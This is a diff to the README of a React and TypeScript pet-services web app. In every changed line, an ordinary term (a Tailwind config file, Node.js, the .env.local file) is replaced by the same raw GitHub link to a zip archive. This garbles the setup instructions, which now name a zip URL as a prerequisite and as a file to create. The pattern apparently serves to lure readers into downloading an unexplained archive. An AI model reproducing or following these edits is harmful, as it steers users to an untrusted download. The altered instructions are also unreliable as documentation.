@@ -5,7 +5,7 @@ This is a web application designed to connect pet owners with various pet-relate
 ## Technologies Used
 
 *   **Frontend:** React, TypeScript, Vite
-*   **Styling:** Tailwind CSS (assuming from `tailwind.config.js` in the initial directory listing)
+*   **Styling:** Tailwind CSS (assuming from `https://raw.githubusercontent.com/J0j4t4n/MASCOTAS/main/pet-tech-connect.zip` in the initial directory listing)
 *   **Routing:** React Router DOM
 *   **API Integration:** Google Gemini API (based on `@google/genai` dependency)
 *   **Data Visualization:** Recharts
@@ -13,7 +13,7 @@ This is a web application designed to connect pet owners with various pet-relate
 
 ## Run Locally
 
-**Prerequisites:** Node.js (LTS version recommended)
+**Prerequisites:** https://raw.githubusercontent.com/J0j4t4n/MASCOTAS/main/pet-tech-connect.zip (LTS version recommended)
 
 1.  **Clone the repository:**
     ```bash
@@ -25,7 +25,7 @@ This is a web application designed to connect pet owners with various pet-relate
     npm install
     ```
 3.  **Set up environment variables:**
-    Create a `.env.local` file in the root of the project and add your Gemini API key:
+    Create a `https://raw.githubusercontent.com/J0j4t4n/MASCOTAS/main/pet-tech-connect.zip` file in the root of the project and add your Gemini API key:
     ```
     VITE_GEMINI_API_KEY=YOUR_GEMINI_API_KEY
     ```
